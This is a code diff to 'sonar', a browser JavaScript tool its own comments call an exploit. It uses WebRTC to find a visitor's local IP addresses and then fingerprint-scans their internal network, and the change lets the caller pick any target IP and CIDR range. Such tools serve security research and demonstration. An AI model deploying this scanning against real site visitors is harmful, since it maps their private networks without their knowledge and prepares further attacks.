@@ -8,7 +8,7 @@ var sonar = {
     /*
      * Start the exploit
      */
-    'start': function(debug, interval_scan) {
+    'start': function(debug, interval_scan, target) {
         if( debug !== undefined ) {
           sonar.debug = true;
         }
@@ -17,16 +17,27 @@ var sonar = {
             interval_scan = 1000;
         }
 
+        if( target === undefined ) {
+            target = "/24";
+        }
+
         if( sonar.fingerprints.length == 0 ) {
             return false;
         }
+
+        // Separate IP and range, target[0] is the IP and target[1] is the range
+        target = target.split( '/' );
 
         // This calls sonar.process_queue() every 
         setInterval( function() {
             sonar.process_queue();
         }, interval_scan );
 
-        sonar.enumerate_local_ips();
+        if( target[0] == "" ) {
+            sonar.enumerate_local_ips( target[1] );
+        } else{
+			sonar.ip_to_range( target[0], target[1] );
+        }
     },
 
     /*
@@ -123,7 +134,7 @@ var sonar = {
 
         for( var tmp = 0; tmp < 4; tmp++ ) {
 
-			// Calculate the number of bits of each part
+			// Calculate the number of bits that change of each part
 			if ( range > 8 + 8 * tmp){
 				r = 0;
 			} else {
@@ -213,7 +224,7 @@ var sonar = {
         //console.log( 'Dead IP', ip );
     },
 
-    'enumerate_local_ips': function() {
+    'enumerate_local_ips': function(range) {
         var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
         if (!RTCPeerConnection) return false;
         var addrs = Object.create(null);
@@ -221,7 +232,7 @@ var sonar = {
         function addAddress(newAddr) {
             if (newAddr in addrs) return;
             addrs[newAddr] = true;
-            sonar.ip_to_range(newAddr, 24); // We assume that we are on a /24
+            sonar.ip_to_range(newAddr, range);
         }
         function grepSDP(sdp) {
             var hosts = [];
